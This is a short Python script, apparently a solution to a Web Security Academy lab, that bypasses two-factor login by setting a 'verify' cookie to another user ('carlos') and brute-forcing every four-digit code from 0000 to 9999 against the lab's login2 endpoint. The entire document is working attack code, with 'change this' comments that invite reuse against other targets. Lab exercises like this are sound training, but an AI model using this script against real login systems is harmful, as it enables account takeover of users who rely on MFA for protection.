#change url
#change cookie

import requests

def mfa_bypass(url):
    for i in range(0, 9999+1):
        fuz = str(i).zfill(4)
    #Cookie: session=K9yeRt6tXoBcYbOSq2G3TEdbhYnI8tAF; verify=wiener
        cookie1 = {
            "session":"K9yeRt6tXoBcYbOSq2G3TEdbhYnI8tAF", #change this
            "verify":"carlos"
        }
        data1 = {
            "mfa-code":"{}".format(fuz)
        }
        r = requests.post(url, cookies=cookie1, data=data1)
        if "Incorrect security code" not in r.text:
            print("try this {} code".format(fuz))
            print(r.text)
#url = https://ac821fd11f90f9c0c02f172d009e0019.web-security-academy.net/login2
#cookies = session=K9yeRt6tXoBcYbOSq2G3TEdbhYnI8tAF; verify=carlos


mfa_bypass("https://ac821fd11f90f9c0c02f172d009e0019.web-security-academy.net/login2") #change this